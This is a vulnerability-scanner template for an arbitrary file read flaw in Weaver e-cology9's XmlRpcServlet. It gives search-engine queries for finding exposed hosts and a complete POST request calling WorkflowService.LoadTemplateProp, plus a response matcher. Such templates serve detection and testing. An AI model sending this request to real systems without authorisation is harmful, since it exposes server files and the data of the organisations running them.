id: Weaver_E-Office9_OA_XmlRpcServlet_Fileread

info:
  name: Weaver_E-Office9_OA_XmlRpcServlet_Fileread
  author: HK
  severity: medium
  description: 泛微e-cology9接口XmlRpcServlet存在任意文件读取漏洞
  metadata:
    max-request: 1
    Hunter-query: body="/wui/common/page/sysRemind.jsp"
    Fofa-query: body="/wui/common/page/sysRemind.jsp"
    Quake-query: body="/wui/common/page/sysRemind.jsp"
    verified: true

http:
- raw:
  - |-
    @timeout: 30s
    POST /weaver/org.apache.xmlrpc.webserver.XmlRpcServlet HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
    Content-Type: application/xml
    Accept-Encoding: gzip
    Content-Length: 206

    <?xml version="1.0" encoding="UTF-8"?>
    <methodCall>
    <methodName>WorkflowService.LoadTemplateProp</methodName>
    <params>
    <param>
    <value><string>weaver</string></value>
    </param>
    </params>
    </methodCall>

  max-redirects: 3
  matchers-condition: and
  matchers:
    - type: word
      part: body
      words:
      - methodResponse